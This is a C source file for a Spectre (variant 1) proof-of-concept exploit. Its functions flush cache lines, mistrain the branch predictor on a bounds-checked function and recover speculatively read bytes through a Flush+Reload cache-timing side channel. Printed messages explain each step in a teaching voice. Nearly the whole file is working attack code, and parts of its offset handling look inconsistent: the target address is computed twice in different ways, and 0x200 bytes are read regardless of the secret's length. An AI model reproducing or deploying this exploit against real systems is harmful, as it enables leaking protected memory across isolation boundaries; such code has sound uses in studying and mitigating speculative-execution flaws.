#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
uint8_t temp = 0;
char *secret = "Super Secure Data";   
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (95)
#define DELTA 1024

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x < buffer_size) {
     return buffer[x];
  } else {
     return 0;
  } 
}

void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

static int scores[256];
void reloadSideChannelImproved()
{
int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  //Iterate over all possible options and test each
  for (i = 0; i < 256; i++) {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD && i != 0)
      scores[i]++; /* if cache hit, add 1 for this value */
  } 
}

void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  volatile int z;
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Train the CPU to take the true branch inside victim().
  for (i = 0; i < 10; i++) {
    _mm_clflush(&buffer_size);
    for (z = 0; z < 100; z++) { }
    restrictedAccess(i);  
  }
  // Flush buffer_size and array[] from the cache.
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  // Ask victim() to return the secret in out-of-order execution.
  for (z = 0; z < 100; z++) { }
  s = restrictedAccess(larger_x);
  array[s*4096 + DELTA] += 88;
}

int main() {
  printf("Description:\n");
  printf("\tWelcome to my spectre POC exploit code. At a high level, this code will read data from a restricted region in an illegal way. The restricted region is a simple function with an if-statement that checks if the input to the function is within a pre-set bounds, then returns the value of an array at the index given if the value was within range. If you want to check out the source (which I encourage you to do!), the restricted region function is titled restrictedAccess().\n");
  printf("\n");
  printf("Diving deeper, this program will do the following under the hood:\n");
  printf("\t1) Create an array and flush it from the cache\n");
  printf("\t2) Access the restricted function legitimately (by supplying values inside the given range) multiple times. This trains the CPU to expect this branch to be taken in the future\n");
  printf("\t3) Flush from the cache the array and size variable used for in-range checking in the restricted region\n");
  printf("\t4) Send a number that is out of range to the restricted region\n");
  printf("\t5) Exfiltrate the data that was returned from the out-of-bounds read in step 4 from the cache\n");
  printf("\t6) Print the value to the screen\n");
  printf("\n");
  printf("Conclusion:\n");
  printf("\tWith this methodology, we successfully read data outside of what should be allowed. If none of this makes sense to you, check out the topics of protected memory, branch prediction, speculative execution, and out-of-order execution.\n\n");
  
  printf("Secret Value:\n ");
  int i;
  uint8_t s;
  size_t larger_x = (size_t)(secret-(char*)buffer);
  printf("%p\n%p\n", larger_x, &secret);
  larger_x = (size_t)(secret-0x100);
  printf("%p\n%p\n", larger_x, &secret);
  flushSideChannel();
  int count;
  int len = strlen(secret);
  char result[len];
  setbuf(stdout, NULL);

  // Iterate over the length of the string
  for (count = 0; count < 0x200; count++) {
	// Reset scores to 0
  	for(i=0;i<256; i++) scores[i]=0;
  	for (i = 0; i < 1000; i++) {
	    	spectreAttack(larger_x + count);
    		reloadSideChannelImproved();
  	}
	// Index of score maximum
  	int max = 0;
  	for (i = 0; i < 256; i++){
	   	if(scores[max] < scores[i])  
			max = i;
  	}
	printf("%c", max);
  }
  printf("\n");
  return (0); 
}
